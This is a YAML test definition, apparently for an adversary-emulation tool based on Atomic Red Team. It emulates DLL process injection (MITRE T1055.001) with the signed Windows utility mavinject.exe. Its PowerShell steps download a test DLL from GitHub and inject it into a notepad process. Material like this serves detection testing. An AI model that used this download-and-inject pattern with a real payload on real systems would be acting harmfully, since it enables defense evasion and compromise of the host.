api_version: "2.0"
name: Process Injection via mavinject.exe
description: |
    Windows 10 Utility To Inject DLLS.

    Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
    With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
args:
    - name: process_id
      type: string
      default: (Start-Process notepad -PassThru).id
    - name: dll_payload
      type: path
      default: PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll
uuid: 74496461-11a1-4982-b439-4d87a550d254
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
        - 'TA0004: Privilege Escalation'
    techniques:
        - 'T1055: Process Injection'
    subtechniques:
        - 'T1055.001: Dynamic-link Library Injection'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Utility to inject must exist on disk at specified location (#{dll_payload})
      inline: |
        if (Test-Path "#{dll_payload}") {exit 0} else {{New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "#{dll_payload}"
        }}
      executor: powershell
    - name: process-injection-via-mavinject.exe
      inline: |
        $mypid = {{.Args.process_id}}
        mavinject $mypid /INJECTRUNNING "{{.Args.dll_payload}}"
        Stop-Process -processname notepad
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
